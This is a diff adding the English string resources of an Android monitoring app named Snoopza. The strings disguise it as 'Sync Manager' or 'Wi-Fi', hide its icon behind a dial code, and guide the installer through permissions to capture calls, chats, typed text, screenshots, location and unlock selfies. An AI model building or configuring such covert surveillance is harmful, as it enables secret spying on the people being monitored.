@@ -1,0 +1,434 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="abc_action_bar_home_description">Navigate home</string>
+    <string name="abc_action_bar_up_description">Navigate up</string>
+    <string name="abc_action_menu_overflow_description">More options</string>
+    <string name="abc_action_mode_done">Done</string>
+    <string name="abc_activity_chooser_view_see_all">See all</string>
+    <string name="abc_activitychooserview_choose_application">Choose an app</string>
+    <string name="abc_capital_off">OFF</string>
+    <string name="abc_capital_on">ON</string>
+    <string name="abc_font_family_body_1_material">sans-serif</string>
+    <string name="abc_font_family_body_2_material">sans-serif-medium</string>
+    <string name="abc_font_family_button_material">sans-serif-medium</string>
+    <string name="abc_font_family_caption_material">sans-serif</string>
+    <string name="abc_font_family_display_1_material">sans-serif</string>
+    <string name="abc_font_family_display_2_material">sans-serif</string>
+    <string name="abc_font_family_display_3_material">sans-serif</string>
+    <string name="abc_font_family_display_4_material">sans-serif-light</string>
+    <string name="abc_font_family_headline_material">sans-serif</string>
+    <string name="abc_font_family_menu_material">sans-serif</string>
+    <string name="abc_font_family_subhead_material">sans-serif</string>
+    <string name="abc_font_family_title_material">sans-serif-medium</string>
+    <string name="abc_menu_alt_shortcut_label">Alt+</string>
+    <string name="abc_menu_ctrl_shortcut_label">Ctrl+</string>
+    <string name="abc_menu_delete_shortcut_label">delete</string>
+    <string name="abc_menu_enter_shortcut_label">enter</string>
+    <string name="abc_menu_function_shortcut_label">Function+</string>
+    <string name="abc_menu_meta_shortcut_label">Meta+</string>
+    <string name="abc_menu_shift_shortcut_label">Shift+</string>
+    <string name="abc_menu_space_shortcut_label">space</string>
+    <string name="abc_menu_sym_shortcut_label">Sym+</string>
+    <string name="abc_prepend_shortcut_label">Menu+</string>
+    <string name="abc_search_hint">Search…</string>
+    <string name="abc_searchview_description_clear">Clear query</string>
+    <string name="abc_searchview_description_query">Search query</string>
+    <string name="abc_searchview_description_search">Search</string>
+    <string name="abc_searchview_description_submit">Submit query</string>
+    <string name="abc_searchview_description_voice">Voice search</string>
+    <string name="abc_shareactionprovider_share_with">Share with</string>
+    <string name="abc_shareactionprovider_share_with_application">Share with %s</string>
+    <string name="abc_toolbar_collapse_description">Collapse</string>
+    <string name="accessibility_service_description">Service synchronization checking</string>
+    <string name="app_log_name">Apps</string>
+    <string name="appbar_scrolling_view_behavior">com.google.android.material.appbar.AppBarLayout$ScrollingViewBehavior</string>
+    <string name="awesome_shape_email"></string>
+    <string name="awesome_shape_eye"></string>
+    <string name="awesome_shape_link"></string>
+    <string name="awesome_shape_lock"></string>
+    <string name="bottom_sheet_behavior">com.google.android.material.bottomsheet.BottomSheetBehavior</string>
+    <string name="character_counter_content_description">Character limit exceeded %1$d of %2$d</string>
+    <string name="character_counter_pattern">%1$d / %2$d</string>
+    <string name="check">Uninstall old version here</string>
+    <string name="chrome_search_text">Search or type web address</string>
+    <string name="date_format_full">d MMM yyyy</string>
+    <string name="date_format_point">dd.MM.yyyy</string>
+    <string name="date_format_short">d MMM</string>
+    <string name="dialog_allow_unknown_source">To update the app, allow “Install unknown apps”.</string>
+    <string name="dialog_battery_optim">Please switch off Optimize battery usage for app to work correctly</string>
+    <string name="dialog_battery_optim_on">Optimize battery usage is still enabled!</string>
+    <string name="dialog_battery_optim_set">":
+ - Change \"Not optimized\" to \"All apps\" item
+ - Find and turn off \"%1$s\" app
+ - Tap \"Back\" button"</string>
+    <string name="dialog_no">No</string>
+    <string name="dialog_ok">OK</string>
+    <string name="dialog_perm_accessibility">Please enable app accessibility service</string>
+    <string name="dialog_perm_accessibility_on">App accessibility service is still disabled!</string>
+    <string name="dialog_perm_app">"Please activate all app permissions:
+ - Open \"Permissions\" item
+ - Activate all permissions"</string>
+    <string name="dialog_perm_app_off">Some app permissions are still disabled!</string>
+    <string name="dialog_perm_notif">Please disable app notifications</string>
+    <string name="dialog_perm_notif_on">App notifications are still enabled!</string>
+    <string name="dialog_perm_overlay">Please activate \"Appear on top\" permission to get Screenshots and Unlock Selfies</string>
+    <string name="dialog_perm_overlay_off">\"Appear on top\" permission is still disabled!</string>
+    <string name="dialog_perm_read_notif">Please allow %1$s to read notifications</string>
+    <string name="dialog_perm_read_notif_off">Access to read notifications is still disabled!</string>
+    <string name="dialog_perm_scr">"Please allow %1$s to capture screen to get screenshots:
+ - Enable \"Don't show again\" item
+ - Tap \"Start now\" button"</string>
+    <string name="dialog_perm_scr_off">Screen capturing is still disabled!</string>
+    <string name="dialog_perm_usage">"Please activate \"Usage data access\" permission to get screenshots:
+ - Find and tap \"%1$s\" app
+ - Enable Usage access
+ - Tap \"Back\" button twice"</string>
+    <string name="dialog_perm_usage_off">\"Usage data access\" permission is still disabled!</string>
+    <string name="dialog_pin_current">Current PIN</string>
+    <string name="dialog_pin_retype">Retype PIN</string>
+    <string name="dialog_pin_specify">New PIN</string>
+    <string name="dialog_run_app">To open hidden app dial:</string>
+    <string name="dialog_run_app_sticker">To open hidden app use \"Sticker\" widget</string>
+    <string name="dialog_src0">DEFAULT</string>
+    <string name="dialog_src1">MIC</string>
+    <string name="dialog_src2">VOICE_UPLINK</string>
+    <string name="dialog_src3">VOICE_DOWNLINK</string>
+    <string name="dialog_src4">VOICE_CALL</string>
+    <string name="dialog_src5">CAMCORDER</string>
+    <string name="dialog_src6">VOICE_RECOGNITION</string>
+    <string name="dialog_src7">VOICE_COMMUNICATION</string>
+    <string name="dialog_src8">REMOTE_SUBMIX</string>
+    <string name="dialog_src9">UNPROCESSED</string>
+    <string name="dialog_uninstall_ask">Do you want to uninstall Monitor?</string>
+    <string name="dialog_update">Update</string>
+    <string name="dialog_wait">Please Wait…</string>
+    <string name="dialog_yes">Yes</string>
+    <string name="email_msg_alarm">Subscription expires after %1$s.</string>
+    <string name="email_msg_alarm_renew">"
+Please renew your subscription."</string>
+    <string name="email_msg_alarm_stop">Subscription has expired.</string>
+    <string name="email_msg_alarm_stop_logs">Paid reports will be discarded unless you start a subscription.</string>
+    <string name="event_count">Count</string>
+    <string name="event_name">Event</string>
+    <string name="fab_transformation_scrim_behavior">com.google.android.material.transformation.FabTransformationScrimBehavior</string>
+    <string name="fab_transformation_sheet_behavior">com.google.android.material.transformation.FabTransformationSheetBehavior</string>
+    <string name="facebook_active">active</string>
+    <string name="facebook_add_your_story">Your Story</string>
+    <string name="facebook_call">Call with</string>
+    <string name="facebook_chat_head_with">"Chat head with "</string>
+    <string name="facebook_datetime_format">"MMM d 'AT' h:mm a"</string>
+    <string name="facebook_datetime_format24">"MMM d 'AT' HH:mm"</string>
+    <string name="facebook_friends">on Facebook</string>
+    <string name="facebook_full_datetime_format">"MMM d, yyyy 'AT' h:mm a"</string>
+    <string name="facebook_full_datetime_format24">"MMM d, yyyy 'AT' HH:mm"</string>
+    <string name="facebook_goto_last_msg">Jump to latest message</string>
+    <string name="facebook_open_profile">Open Profile Menu</string>
+    <string name="facebook_thread_details">Thread details</string>
+    <string name="facebook_time_ago">ago</string>
+    <string name="facebook_time_now">now</string>
+    <string name="facebook_unread">Unread</string>
+    <string name="facebook_weekdaytime_format">"EEE 'AT' h:mm a"</string>
+    <string name="facebook_weekdaytime_format24">"EEE 'AT' HH:mm"</string>
+    <string name="facebook_you">You:</string>
+    <string name="firefox_search_text">Search or enter address</string>
+    <string name="general_password">Please Enter Your PIN</string>
+    <string name="global_app_name">Sync Manager</string>
+    <string name="global_dbl_name">Wi-Fi</string>
+    <string name="global_name">Snoopza</string>
+    <string name="global_settings_name">Settings</string>
+    <string name="gm_now">Now</string>
+    <string name="grial_shape_degree"></string>
+    <string name="grial_shape_phone_large"></string>
+    <string name="hangouts_call">Voice call from</string>
+    <string name="hangouts_conversation">Conversation:</string>
+    <string name="hangouts_date_format_with_year">MM/dd/yy h:mm a</string>
+    <string name="hangouts_date_format_with_year_24">MM/dd/yy HH:mm</string>
+    <string name="hangouts_from">"from "</string>
+    <string name="hangouts_minute">minute</string>
+    <string name="hangouts_right_now">Now</string>
+    <string name="hangouts_second">second</string>
+    <string name="hangouts_seen_by">"Seen by "</string>
+    <string name="hangouts_simple_date_format">MMMM d h:mm a</string>
+    <string name="hangouts_simple_date_format_24">MMMM d HH:mm</string>
+    <string name="hangouts_wait">Calling %1$s…</string>
+    <string name="hangouts_week_date_format">EEEE h:mm a</string>
+    <string name="hangouts_week_date_format_24">EEEE HH:mm</string>
+    <string name="hide_bottom_view_on_scroll_behavior">com.google.android.material.behavior.HideBottomViewOnScrollBehavior</string>
+    <string name="hint_change_pin_new">Enter new PIN</string>
+    <string name="hint_enter_pin">Enter PIN</string>
+    <string name="hint_sms_hiden">[Hidden]</string>
+    <string name="ignore">Skip this step</string>
+    <string name="im_log_name">IM</string>
+    <string name="img_empty_description" />
+    <string name="img_logo_caption">SNOOPZA</string>
+    <string name="inst_accessibility_activate_action">TURN ON SERVICE</string>
+    <string name="inst_accessibility_browsers_list">Chrome, Opera, Firefox, Samsung, Mint, ASUS</string>
+    <string name="inst_accessibility_caption">Select Additional Activities to Track</string>
+    <string name="inst_accessibility_chats">Chat messages</string>
+    <string name="inst_accessibility_chats_list">WhatsApp, Facebook Messenger, Viber, Hangouts</string>
+    <string name="inst_accessibility_hint">"To have access to screen content you need to activate the accessibility service:
+Choose '%1$s' app in the list and enable it. Return back to this page. (System can close app at this moment)"</string>
+    <string name="inst_accessibility_sites">Websites history</string>
+    <string name="inst_call_recording">Phone calls recordings</string>
+    <string name="inst_chat_recording">Chat calls recordings</string>
+    <string name="inst_chose_device_type">Please chose device type</string>
+    <string name="inst_enable_location_access">"Application requires access to location:
+
+1. Find and tap 'Permissions' setting.
+2. Find and tap 'Location' setting.
+3. Enable: 'Allow all the time'."</string>
+    <string name="inst_finish_action">Finish installation</string>
+    <string name="inst_finish_caption">Configuration Completed</string>
+    <string name="inst_finish_hint">"Installation completed!
+See logs in your account."</string>
+    <string name="inst_hello_cancel">Cancel Installation</string>
+    <string name="inst_hello_caption">Making This Device Monitorable</string>
+    <string name="inst_hello_hint">If you intend to monitor this device then you need to complete all configuration steps. Make sure you have a registered account and press NEXT.</string>
+    <string name="inst_license_caption">End User License Agreement</string>
+    <string name="inst_log_select_all">All activities</string>
+    <string name="inst_log_select_apps">Apps</string>
+    <string name="inst_log_select_calendar">Calendar</string>
+    <string name="inst_log_select_calls">Call logs</string>
+    <string name="inst_log_select_caption">Device Activities to Track</string>
+    <string name="inst_log_select_contacts">Contacts</string>
+    <string name="inst_log_select_gallery">Gallery</string>
+    <string name="inst_log_select_hint">"If you leave some options unchecked you won't be able to turn them on remotely. You would need physical access to a device."</string>
+    <string name="inst_log_select_location">Location</string>
+    <string name="inst_log_select_sms">SMS/MMS</string>
+    <string name="inst_log_select_system">System events</string>
+    <string name="inst_log_select_system_hint">(SIM, battery, networks info)</string>
+    <string name="inst_log_select_unlock">Unlock photos</string>
+    <string name="inst_log_typed_text">Typed text</string>
+    <string name="inst_login_activate">Activate</string>
+    <string name="inst_login_caption">Please Enter Your Credentials</string>
+    <string name="inst_login_forgot_password">Forgot password?</string>
+    <string name="inst_login_hint_email">Enter email</string>
+    <string name="inst_login_hint_password">Enter password</string>
+    <string name="inst_old_version_found">Please uninstall the following old version(s) to avoid possible errors:</string>
+    <string name="inst_pin_caption">Set Up Your PIN</string>
+    <string name="inst_pin_change">Change PIN</string>
+    <string name="inst_pin_change_hint">PIN</string>
+    <string name="inst_pin_change_icon">Android restricts hiding app icons. The app will appear on a device under the WiFi icon.</string>
+    <string name="inst_pin_hide_app">Hide application icon</string>
+    <string name="inst_pin_hint">Application can be launched by dialing ***%1$s###</string>
+    <string name="inst_pin_turn_on">Protect application by PIN</string>
+    <string name="inst_rec_warning">Calls may not be recorded properly on some Android phone models</string>
+    <string name="inst_requiremens_a11y">Accessibility Service</string>
+    <string name="inst_requiremens_a11y_hint">Accessibility service is required to provide extended monitoring functions.</string>
+    <string name="inst_requiremens_a11y_instruction">"1. Tap Installed (downloaded) services.
+ 2. Tap '%1$s'.
+ 3. Turn on the switch and tap Allow.
+ 4. Tap system BACK button until you return to this page."</string>
+    <string name="inst_requiremens_a11y_instruction_14">"
+
+ If the service activation is blocked, open Settings>Apps>'%1$s', find the \"Allow Restricted Settings\" and turn it on. If it is not in the settings, click the 3 dots in the upper right corner, then turn it on and then repeat the service activation."</string>
+    <string name="inst_requiremens_a11y_instruction_header">To activate the accessibility service:</string>
+    <string name="inst_requiremens_basic">Basic Permissions</string>
+    <string name="inst_requiremens_basic_hint">Application requires access to storage, phone settings, call logs and contacts.</string>
+    <string name="inst_requiremens_basic_instruction">"1. Find and tap 'Permissions' setting.
+
+2. Enable:
+\u0009- Contacts
+\u0009- Phone
+\u0009- Storage
+
+3. Tap system BACK button until you return to this page."</string>
+    <string name="inst_requiremens_basic_instruction_26">"1. Find and tap 'Permissions' setting.
+
+2. Enable:
+\u0009- Call logs
+\u0009- Contacts
+\u0009- Phone
+\u0009- Storage
+
+3. Tap system BACK button until you return to this page."</string>
+    <string name="inst_requiremens_basic_instruction_header">To allow permissions:</string>
+    <string name="inst_requiremens_battery">Disable Battery Optimization</string>
+    <string name="inst_requiremens_battery_hint">Let the app always run in background (Battery Optimization OFF) to prevent the app from stopping due to battery saving</string>
+    <string name="inst_requiremens_caption">Application Requirements</string>
+    <string name="inst_requiremens_everything_ready">Almost done! Just a few more steps!</string>
+    <string name="inst_requiremens_files_access_header">To allow storage access:</string>
+    <string name="inst_requiremens_files_access_instruction">1. Scroll the list until you see <b>"'%1$s'"</b>" application.
+
+2. "<b>Turn on</b>" switch to grant permission.
+
+3. Tap system "<b>BACK</b> button until you return to this page.</string>
+    <string name="inst_requiremens_hint">Please enable all listed options for application to function properly</string>
+    <string name="inst_requiremens_notifications">Disable App Notifications</string>
+    <string name="inst_requiremens_notifications_access">Access to Notifications</string>
+    <string name="inst_requiremens_notifications_access_hint">This permission allows to read notifications.</string>
+    <string name="inst_requiremens_notifications_access_instruction">1. Scroll the list until you see <b>"'%1$s'"</b>" application.
+
+2. "<b>Turn on</b>" switch to grant permission.
+
+3. "<b>Tap</b> <b>Allow</b>".
+
+4. Tap system "<b>BACK</b> button until you return to this page.</string>
+    <string name="inst_requiremens_notifications_access_instruction_header">To permit notifications access:</string>
+    <string name="inst_requiremens_notifications_hint">Notifications from this application should be switched OFF as they may be too bothersome.</string>
+    <string name="inst_requiremens_notifications_instruction">"1. Find and tap 'Notifications' setting.
+
+2. Turn "<b>OFF</b>" the main switch.
+
+3. Tap system "<b>BACK</b> button until you return to this page.</string>
+    <string name="inst_requiremens_notifications_instruction_26">1. Turn <b>OFF</b>" 'Show notifications' toggle.
+
+2. Tap system "<b>BACK</b> button to return to this page.</string>
+    <string name="inst_requiremens_notifications_instruction_header">To disable notifications from this app:</string>
+    <string name="inst_requiremens_overlay">Overlay Permission</string>
+    <string name="inst_requiremens_overlay_hint">The application should be able to display on top of other apps.</string>
+    <string name="inst_requiremens_usage">Access to Usage</string>
+    <string name="inst_requiremens_usage_hint">This permission allows to track activity of other applications.</string>
+    <string name="inst_requiremens_usage_instruction">1. Scroll the list until you see <b>"'%1$s'"</b>" application.
+
+2. "<b>Tap</b>" the application.
+
+3. "<b>Turn on</b>" switch to grant permission.
+
+4. Tap system "<b>BACK</b> button until you return to this page.</string>
+    <string name="inst_requiremens_usage_instruction_header">To permit usage access:</string>
+    <string name="inst_screenshots_caption">What Types of Screenshots Would You Like to Record?</string>
+    <string name="inst_screenshots_hint">"You need to allow the app to take screenshots without future confirmations. Set up 'Don't show again' checkbox in the permission request dialog and press START NOW button."</string>
+    <string name="inst_screenshots_im">of Instant Messengers</string>
+    <string name="inst_screenshots_sms">of SMS/MMS</string>
+    <string name="inst_screenshots_timer">Timed, of Current Activity</string>
+    <string name="inst_screenshots_title">Screenshots:</string>
+    <string name="inst_screenshots_web">of Web Browsers</string>
+    <string name="inst_type_caption">Please confirm that this application will be used properly</string>
+    <string name="inst_type_confirmation">I confirm that the user of this device is informed about monitoring software and I have their explicit agreement</string>
+    <string name="inst_type_employee">Employee device</string>
+    <string name="inst_type_intention">"I'm going to use this software to monitor:"</string>
+    <string name="inst_type_kids">"My kid's device"</string>
+    <string name="inst_type_own">My own device</string>
+    <string name="license_accept">I accept</string>
+    <string name="license_read">I have read and understood the terms</string>
+    <string name="license_text"><b>1.</b>" You are aware that this software can record, store and transmit information about device usage and its user activity. 
+ 
+"<b>2.</b>" You are allowed to use this software only under the following conditions: 
+You are using this software on a device that you own and personally use; 
+You have explicit written consent of the owner and all users of the device to be monitored; 
+You are a legal guardian of the user of the device to be monitored; 
+ 
+"<b>3.</b> You know and comply with the laws and regulations that cover privacy, confidentiality and the use of such monitoring software in your jurisdiction. You assume full responsibility for installing or using the software. Developers, sellers or distributors of the software cannot be held responsible for any legal violations or consequences that result from you installing or using the software.</string>
+    <string name="log_files_name">Gallery</string>
+    <string name="log_name_audio">Audio</string>
+    <string name="log_name_file">File</string>
+    <string name="log_name_gif">Gif</string>
+    <string name="log_name_image">Image</string>
+    <string name="log_name_sticker">Sticker</string>
+    <string name="log_name_video">Video</string>
+    <string name="menu_change_email">Change email settings</string>
+    <string name="menu_change_pin">Change app PIN</string>
+    <string name="menu_check_app_state">Check app permissions</string>
+    <string name="menu_check_update">Check for updates</string>
+    <string name="menu_clear">Clear local logs</string>
+    <string name="menu_close">Close</string>
+    <string name="menu_disable_pin_protection">Disable PIN protection</string>
+    <string name="menu_enable_pin_protection">Enable PIN protection</string>
+    <string name="menu_hide_icon">Hide %1$s icon</string>
+    <string name="menu_reset_app_perm">Reset app permissions</string>
+    <string name="menu_reset_license">Reset license</string>
+    <string name="menu_select_source">Change audio source</string>
+    <string name="menu_show_icon">Show %1$s icon</string>
+    <string name="menu_uninstall">Uninstall</string>
+    <string name="module_calendar">Calendar events</string>
+    <string name="module_calls">Calls</string>
+    <string name="module_contacts">Contacts</string>
+    <string name="module_files">Files</string>
+    <string name="module_location">Location</string>
+    <string name="module_mms">MMS</string>
+    <string name="module_photo">Unlock Selfies</string>
+    <string name="module_screen_shot">Screenshots</string>
+    <string name="module_sim">Changing SIM card</string>
+    <string name="module_sms">SMS</string>
+    <string name="module_web">Visited websites</string>
+    <string name="month_format">MMM</string>
+    <string name="mtrl_chip_close_icon_content_description">Remove %1$s</string>
+    <string name="next">next</string>
+    <string name="opera_search_text">Search or enter address</string>
+    <string name="password_toggle_content_description">Show password</string>
+    <string name="path_password_eye">M12,4.5C7,4.5 2.73,7.61 1,12c1.73,4.39 6,7.5 11,7.5s9.27,-3.11 11,-7.5c-1.73,-4.39 -6,-7.5 -11,-7.5zM12,17c-2.76,0 -5,-2.24 -5,-5s2.24,-5 5,-5 5,2.24 5,5 -2.24,5 -5,5zM12,9c-1.66,0 -3,1.34 -3,3s1.34,3 3,3 3,-1.34 3,-3 -1.34,-3 -3,-3z</string>
+    <string name="path_password_eye_mask_strike_through">M2,4.27 L19.73,22 L22.27,19.46 L4.54,1.73 L4.54,1 L23,1 L23,23 L1,23 L1,4.27 Z</string>
+    <string name="path_password_eye_mask_visible">M2,4.27 L2,4.27 L4.54,1.73 L4.54,1.73 L4.54,1 L23,1 L23,23 L1,23 L1,4.27 Z</string>
+    <string name="path_password_strike_through">M3.27,4.27 L19.74,20.74</string>
+    <string name="search_menu_title">Search</string>
+    <string name="shared_log_cache">settings</string>
+    <string name="shared_log_cache_app">settings_app</string>
+    <string name="skype_call">RINGING</string>
+    <string name="skype_call_cancel">Dismiss</string>
+    <string name="skype_call_conn">CONNECTING</string>
+    <string name="skype_call_end">End Call</string>
+    <string name="skype_start">"Play audio message, "</string>
+    <string name="skype_stop">Pause audio message</string>
+    <string name="status_Version">App version:</string>
+    <string name="status_activated">Activation</string>
+    <string name="status_bar_notification_info_overflow">999+</string>
+    <string name="status_internet_connection">No Internet connection</string>
+    <string name="status_last_send">Last data upload:</string>
+    <string name="status_last_sync">Last connection:</string>
+    <string name="status_memory_usage">Memory usage</string>
+    <string name="status_monitor_disabled">Monitor disabled</string>
+    <string name="status_monitor_enabled">Monitor enabled</string>
+    <string name="status_record">Record</string>
+    <string name="status_send_data_period">Data upload period</string>
+    <string name="status_server_connected">Connected</string>
+    <string name="status_valid">valid through</string>
+    <string name="status_wifi">only Wi-Fi</string>
+    <string name="telegram_date_format_full">MMM d, yyyy</string>
+    <string name="telegram_date_format_short">MMM d</string>
+    <string name="telegram_got">Received at</string>
+    <string name="telegram_got_ans1">Has</string>
+    <string name="telegram_got_ans2">replie</string>
+    <string name="telegram_loaded">Downloaded</string>
+    <string name="telegram_pause">Pause</string>
+    <string name="telegram_sending">Sending</string>
+    <string name="telegram_sent">Sent at</string>
+    <string name="telegram_video">Video</string>
+    <string name="telegram_viewed">Viewed</string>
+    <string name="telegram_voice">Voice message</string>
+    <string name="text_log_name">Typed text</string>
+    <string name="time_day">d.</string>
+    <string name="time_format_12">h:mm a</string>
+    <string name="time_format_24">HH:mm</string>
+    <string name="time_hrs">h.</string>
+    <string name="time_min">m.</string>
+    <string name="time_sec">s.</string>
+    <string name="title_activity_installer">Installer</string>
+    <string name="toast_digit_pin">PIN must contain digits only</string>
+    <string name="toast_empty_email">Enter account email</string>
+    <string name="toast_empty_password">Enter account password</string>
+    <string name="toast_empty_pin">Enter app PIN</string>
+    <string name="toast_error_activation">Activation error</string>
+    <string name="toast_hide_icon">%1$s icon will be hidden after app closing.</string>
+    <string name="toast_length_pin">PIN must contain 4 digits only</string>
+    <string name="toast_license_limit">license error.</string>
+    <string name="toast_license_locked">license locked.</string>
+    <string name="toast_logs_cleared">Local logs successfully cleared</string>
+    <string name="toast_no_inet">Please, check internet connection</string>
+    <string name="toast_not_same_pin">"PIN codes don't match"</string>
+    <string name="toast_pin_changed">PIN successfully changed</string>
+    <string name="toast_reset_app_perms">Both permissions already disabled</string>
+    <string name="toast_server_not_available">Server is not available. Check internet connection or try again later.</string>
+    <string name="toast_show_icon">%1$s icon will be visible after app closing.</string>
+    <string name="toast_unkn_err">unknown error:</string>
+    <string name="toast_wrong_account_or_password">Wrong account email or password.</string>
+    <string name="toast_wrong_pin">Incorrect PIN</string>
+    <string name="today">Today</string>
+    <string name="update_current_version">Current version: %1$s</string>
+    <string name="update_new_version">New version: %1$s</string>
+    <string name="update_status_error_disable_link">Update link is not available. Please try again later</string>
+    <string name="update_status_error_disable_server">Server is unavailable. Check your Internet connection</string>
+    <string name="update_status_error_download">Error loading updates</string>
+    <string name="update_status_ok_check_link">Verifying the update link</string>
+    <string name="update_status_ok_check_server">Verifying access to server.</string>
+    <string name="update_status_ok_download_update">Downloading updates…</string>
+    <string name="update_status_ok_install">Installing updates…</string>
+    <string name="viber_change">Edit</string>
+    <string name="viber_date_format_full">M/d/yy</string>
+    <string name="week_format">EEE</string>
+    <string name="whatsapp_date_format_full">dd MMMM yyyy</string>
+    <string name="widget_enter_note">Enter text</string>
+    <string name="widget_hint">Tap to input text</string>
+    <string name="widget_name">Sticker</string>
+    <string name="yesterday">Yesterday</string>
+</resources>
